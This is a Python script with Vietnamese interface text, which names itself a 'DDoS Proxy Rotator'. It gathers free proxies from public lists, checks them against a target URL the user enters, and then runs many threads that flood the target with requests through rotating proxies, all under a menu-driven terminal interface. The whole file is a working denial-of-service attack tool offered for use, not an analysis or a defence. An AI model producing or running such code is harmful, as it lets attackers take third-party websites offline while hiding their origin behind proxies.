import os
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
from rich.live import Live
from rich.panel import Panel
from rich.text import Text
import requests

console = Console()

# ASCII Art m·∫´u
ascii_art = """
[bold blue]
                               
   ‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë
   ‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
   ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïë‚ñë‚ïö‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë
   ‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù                 
[/bold blue]
[cyan]Tool: DDoS Proxy Rotator with Rich UI[/cyan]
"""

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-proxy/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/hookzofsocks/qQMGR/master/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt"
]

active_proxies = []
target_url = ""
error_count = {}
MAX_ERRORS = 3

# S·ªë lu·ªìng m·∫∑c ƒë·ªãnh 
proxy_threads = 50
ddos_threads = 100

# Bi·∫øn ƒëi·ªÅu khi·ªÉn v√≤ng l·∫∑p
running = True

def fetch_proxies():
    proxies = set()
    with console.status("[cyan] ƒêang t·∫£i danh s√°ch proxy..."):
        for url in PROXY_SOURCES:
            try:
                res = requests.get(url, timeout=10)
                for line in res.text.splitlines():
                    if ':' in line:
                        proxies.add(line.strip())
            except Exception as e:
                console.print(f"[yellow]L·ªói t·∫£i t·ª´ {url}: {e}[/]")
                continue
    return list(proxies)

def test_proxy(proxy):
    global target_url
    try:
        session = requests.Session()
        session.proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}' 
        }
        session.get(target_url, timeout=15)
        return True, proxy
    except:
        return False, proxy

def scan_proxies_with_progress(threads):
    global active_proxies
    proxy_list = fetch_proxies()
    total = len(proxy_list)
    success = 0
    failed = 0

    active_proxies.clear()

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        transient=False,
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Ki·ªÉm tra ch·∫•t l∆∞·ª£ng proxy...", total=total)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(test_proxy, proxy): proxy for proxy in proxy_list}
            for future in futures:
                result, proxy = future.result()
                if result:
                    active_proxies.append(proxy)
                    success += 1
                else:
                    failed += 1
                progress.update(task, advance=1)

    console.print(f"[green]‚úÖ Th√†nh c√¥ng: {success}[/]")
    console.print(f"[red]‚ùå Th·∫•t b·∫°i: {failed}[/]")
    return len(active_proxies)

def attack_with_proxy(proxy):
    global target_url, error_count
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        response = requests.get(target_url, headers=headers, proxies={"http": f"http://{proxy}", "https": f"https://{proxy}"},  timeout=10)
        if response.status_code in [200, 403, 429]:
            return True
        else:
            return False
    except:
        error_count[proxy] = error_count.get(proxy, 0) + 1
        if error_count[proxy] >= MAX_ERRORS and proxy in active_proxies:
            active_proxies.remove(proxy)
        return False

def ddos_attack_loop():
    global running
    while running:
        if not active_proxies:
            console.print("[bold red] Kh√¥ng c√≤n proxy kh·∫£ d·ª•ng! Qu√©t l·∫°i...")
            scan_proxies_with_progress(proxy_threads)
            if not active_proxies:
                console.print("[bold yellow] V·∫´n ch∆∞a t√¨m th·∫•y proxy n√†o kh·∫£ d·ª•ng!")
                time.sleep(5)
                continue
        proxy = random.choice(active_proxies)
        try:
            attack_with_proxy(proxy)
        except Exception:
            pass

def show_menu():
    console.clear()
    console.print(Panel(Text.from_markup(ascii_art), border_style="blue"))
    console.print("[bold cyan][1][/bold cyan] Nh·∫≠p URL & qu√©t proxy")
    console.print("[bold cyan][2][/bold cyan] B·∫Øt ƒë·∫ßu t·∫•n c√¥ng DDoS")
    console.print("[bold cyan][3][/bold cyan] Thay ƒë·ªïi s·ªë lu·ªìng")
    console.print("[bold cyan][4][/bold cyan] Tho√°t")

def change_threads():
    global proxy_threads, ddos_threads
    console.print("[bold cyan]Nh·∫≠p s·ªë lu·ªìng qu√©t proxy:")
    proxy_input = input("Lu·ªìng qu√©t proxy: ").strip()
    try:
        proxy_threads = int(proxy_input)
    except:
        console.print("[red]Gi√° tr·ªã kh√¥ng h·ª£p l·ªá, gi·ªØ nguy√™n gi√° tr·ªã c≈©.[/red]")

    console.print("[bold cyan]Nh·∫≠p s·ªë lu·ªìng DDoS:")
    ddos_input = input("Lu·ªìng DDoS: ").strip()
    try:
        ddos_threads = int(ddos_input)
    except:
        console.print("[red]Gi√° tr·ªã kh√¥ng h·ª£p l·ªá, gi·ªØ nguy√™n gi√° tr·ªã c≈©.[/red]")

def signal_handler(sig, frame):
    global running
    running = False
    console.print("\n[yellow]ƒêang d·ª´ng t·∫•t c·∫£ c√°c lu·ªìng...[/yellow]")
    time.sleep(1)
    console.print("[green]‚úÖ D·ª´ng th√†nh c√¥ng![/green]")
    sys.exit(0)

def main():
    global target_url, active_proxies, ddos_threads, running

    # ƒêƒÉng k√Ω t√≠n hi·ªáu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while running:
        show_menu()
        choice = input("Ch·ªçn ch·ª©c nƒÉng (1/2/3/4): ").strip()

        if choice == "1":
            console.print("[bold cyan]Nh·∫≠p URL m·ª•c ti√™u:")
            target_url = input("URL: ").strip()
            if not target_url.startswith("http"):
                target_url = "http://" + target_url

            proxy_count = scan_proxies_with_progress(proxy_threads)
            console.print(f"[green]‚úÖ T√¨m ƒë∆∞·ª£c {len(active_proxies)} proxy ho·∫°t ƒë·ªông![/]")

        elif choice == "2":
            if not target_url or not active_proxies:
                console.print("[bold red]Vui l√≤ng nh·∫≠p URL v√† qu√©t proxy tr∆∞·ªõc![/]")
                time.sleep(2)
                continue

            threads = []
            for _ in range(ddos_threads):
                t = threading.Thread(target=ddos_attack_loop, daemon=True)
                t.start()
                threads.append(t)

            # B·∫£ng tr·∫°ng th√°i live
            with Live(Table(title="üìä Tr·∫°ng th√°i t·∫•n c√¥ng"), refresh_per_second=1) as live:
                while running:
                    table = Table()
                    table.add_column("Target", justify="center")
                    table.add_column("[green]Th√†nh c√¥ng", justify="center")
                    table.add_column("[red]L·ªói", justify="center")
                    table.add_column("[yellow]T·ªïng", justify="center")

                    success = 0
                    failed = sum(error_count.values())
                    total = len(active_proxies)
                    table.add_row(target_url, str(success), str(failed), str(total))
                    live.update(table)
                    time.sleep(1)

        elif choice == "3":
            change_threads()
            console.print(f"[green]‚úÖ C·∫≠p nh·∫≠t th√†nh c√¥ng: Lu·ªìng qu√©t proxy={proxy_threads}, Lu·ªìng DDoS={ddos_threads}[/green]")
            time.sleep(2)

        elif choice == "4":
            running = False
            console.print("[bold green]ƒê√£ tho√°t ch∆∞∆°ng tr√¨nh.[/]")
            break
        else:
            console.print("[bold red]L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá![/]")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        signal_handler(None, None)